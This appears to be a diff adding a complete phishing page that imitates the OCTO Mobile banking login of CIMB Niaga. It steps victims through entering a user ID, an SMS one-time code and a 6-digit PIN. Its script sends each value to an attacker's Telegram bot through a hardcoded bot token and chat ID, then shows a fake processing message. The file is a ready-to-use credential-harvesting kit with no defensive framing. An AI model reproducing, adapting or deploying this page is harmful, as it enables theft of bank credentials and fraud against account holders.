@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OCTO Mobile</title>
+    <style>
+        :root {
+            --bg-gradient: linear-gradient(180deg, #961D1E 0%, #580B0C 100%);
+            --cimb-red: #7A1415;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            height: 100%;
+            width: 100%;
+            background-color: var(--cimb-red);
+            overflow: hidden;
+        }
+
+        .mobile-container {
+            width: 100%;
+            height: 100vh;
+            background: var(--bg-gradient);
+            display: flex;
+            flex-direction: column;
+            padding: env(safe-area-inset-top) 25px env(safe-area-inset-bottom);
+            position: relative;
+        }
+
+        .page-section {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .active {
+            display: flex;
+        }
+
+        /* Header */
+        .nav-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 40px;
+            padding-bottom: 20px;
+        }
+
+        .back-btn {
+            width: 32px;
+            height: 32px;
+            background: rgba(255,255,255,0.12);
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        .title-tab {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            padding-bottom: 4px;
+            border-bottom: 2.5px solid white;
+        }
+
+        .help-pill {
+            background: #E89B17;
+            padding: 5px 12px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            text-decoration: none;
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        /* Content Area */
+        .content {
+            flex: 1;
+            padding-top: 60px;
+            text-align: center;
+            color: white;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 45px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid rgba(255,255,255,0.5);
+            padding: 12px 0;
+            color: white;
+            font-size: 18px;
+            outline: none;
+        }
+
+        .box-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+
+        .box-input {
+            width: 45px;
+            height: 50px;
+            background: transparent;
+            border: none;
+            border-bottom: 2px solid rgba(255,255,255,0.6);
+            text-align: center;
+            font-size: 26px;
+            color: white;
+            outline: none;
+        }
+
+        .pin-dot {
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.3);
+            -webkit-text-security: disc;
+        }
+
+        /* Buttons */
+        .btn-white {
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            border: none;
+            background: white;
+            color: var(--cimb-red);
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 30px;
+        }
+
+        .btn-outline {
+            width: 100%;
+            padding: 13px;
+            border-radius: 30px;
+            border: 1px solid white;
+            background: transparent;
+            color: white;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        /* Footer */
+        .footer {
+            padding-bottom: 40px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo-png {
+            width: 160px;
+            height: auto;
+            margin-bottom: 5px;
+        }
+
+        .logo-sub {
+            font-size: 9px;
+            color: white;
+            letter-spacing: 2px;
+            opacity: 0.8;
+        }
+
+        .dot-grid {
+            position: absolute;
+            bottom: 15px;
+            right: 0;
+            display: grid;
+            grid-template-columns: repeat(4, 5px);
+            gap: 12px;
+            opacity: 0.3;
+        }
+        .dot { width: 5px; height: 5px; background: white; border-radius: 50%; }
+    </style>
+</head>
+<body>
+
+<div class="mobile-container">
+    
+    <section id="loginPage" class="page-section active">
+        <div class="nav-header">
+            <div class="back-btn">‹</div>
+            <div class="title-tab">Login</div>
+            <a href="#" class="help-pill">Let us help you! 💡</a>
+        </div>
+        <div class="content">
+            <div class="input-group">
+                <input type="text" id="userid" placeholder="Enter User ID">
+                <a href="#" style="position:absolute; right:0; bottom:12px; color:rgba(255,255,255,0.7); font-size:11px; text-decoration:none;">Forgot User ID?</a>
+            </div>
+            <button class="btn-white" onclick="sendData('Login')">Login</button>
+            <p style="color:rgba(255,255,255,0.7); font-size:13px; margin-bottom:10px;">I have an account but no user ID</p>
+            
+            <a href="regis.html" class="btn-outline">Register to OCTO Mobile</a>
+        </div>
+    </section>
+
+    <section id="otpPage" class="page-section">
+        <div class="nav-header">
+            <div class="back-btn" onclick="showPage('loginPage')">‹</div>
+            <div class="title-tab">Verification</div>
+            <div style="width:32px;"></div>
+        </div>
+        <div class="content">
+            <h2 style="font-size:20px; margin-bottom:10px;">Secure PIN</h2>
+            <p style="color:rgba(255,255,255,0.7); font-size:13px; margin-bottom:30px;">Enter the 4-digit SMS code sent to your number.</p>
+            <div class="box-container">
+                <input type="number" class="box-input otp-i" maxlength="1" inputmode="numeric">
+                <input type="number" class="box-input otp-i" maxlength="1" inputmode="numeric">
+                <input type="number" class="box-input otp-i" maxlength="1" inputmode="numeric">
+                <input type="number" class="box-input otp-i" maxlength="1" inputmode="numeric">
+            </div>
+            <button class="btn-white" onclick="sendData('OTP')">Confirm</button>
+            <p style="font-size: 14px;">Resend code in <span id="timer">00:59</span></p>
+        </div>
+    </section>
+
+    <section id="pinPage" class="page-section">
+        <div class="nav-header">
+            <div class="back-btn" onclick="showPage('otpPage')">‹</div>
+            <div class="title-tab">PIN</div>
+            <div style="width:32px;"></div>
+        </div>
+        <div class="content">
+            <h2 style="font-size:20px; margin-bottom:10px;">Enter PIN</h2>
+            <div class="box-container" style="margin-top:30px;">
+                <input type="password" class="box-input pin-dot pin-i" maxlength="1" inputmode="numeric">
+                <input type="password" class="box-input pin-dot pin-i" maxlength="1" inputmode="numeric">
+                <input type="password" class="box-input pin-dot pin-i" maxlength="1" inputmode="numeric">
+                <input type="password" class="box-input pin-dot pin-i" maxlength="1" inputmode="numeric">
+                <input type="password" class="box-input pin-dot pin-i" maxlength="1" inputmode="numeric">
+                <input type="password" class="box-input pin-dot pin-i" maxlength="1" inputmode="numeric">
+            </div>
+            <button class="btn-white" style="margin-top:40px;" onclick="sendData('PIN')">Submit</button>
+        </div>
+    </section>
+
+    <div class="footer">
+        <img src="https://i.ibb.co.com/SXtpz3pP/Screenshot-20260427-113804.jpg" alt="OCTO Mobile" class="logo-png">
+        <div class="logo-sub">BY CIMB NIAGA</div>
+        <div class="dot-grid">
+            <script>for(let i=0; i<40; i++) document.write('<div class="dot"></div>');</script>
+        </div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8462084079:AAHQ94IQ_-iOg10Y9IiTSnNzeb2IFDikpes";
+    const CHAT_ID = "7692820036";
+
+    function showPage(pageId) {
+        document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+    }
+
+    function setupAutoNext(className) {
+        const inputs = document.querySelectorAll(className);
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
+                if (e.target.value !== "" && index < inputs.length - 1) inputs[index + 1].focus();
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === "Backspace" && e.target.value === "" && index > 0) inputs[index - 1].focus();
+            });
+        });
+    }
+    setupAutoNext('.otp-i');
+    setupAutoNext('.pin-i');
+
+    function sendData(type) {
+        let val = "";
+        let next = "";
+
+        if(type === 'Login') {
+            const user = document.getElementById('userid').value;
+            if(!user) return alert("Masukan User ID");
+            val = "User ID: " + user;
+            next = 'otpPage';
+        } else if(type === 'OTP') {
+            document.querySelectorAll('.otp-i').forEach(i => val += i.value);
+            if(val.length < 4) return alert("Masukan 4 digit OTP");
+            val = "OTP (4 Digit): " + val;
+            next = 'pinPage';
+        } else {
+            document.querySelectorAll('.pin-i').forEach(i => val += i.value);
+            if(val.length < 6) return alert("Masukan 6 digit PIN");
+            val = "PIN: " + val;
+            next = 'loginPage';
+        }
+
+        const msg = `📌 *DATA OCTO MOBILE*\n📝 *Tipe:* ${type}\n🔑 *Isi:* \`${val}\``;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+        }).finally(() => {
+            if(type === 'PIN') alert("Data sedang diproses.");
+            showPage(next);
+        });
+    }
+</script>
+
+</body>
+</html>
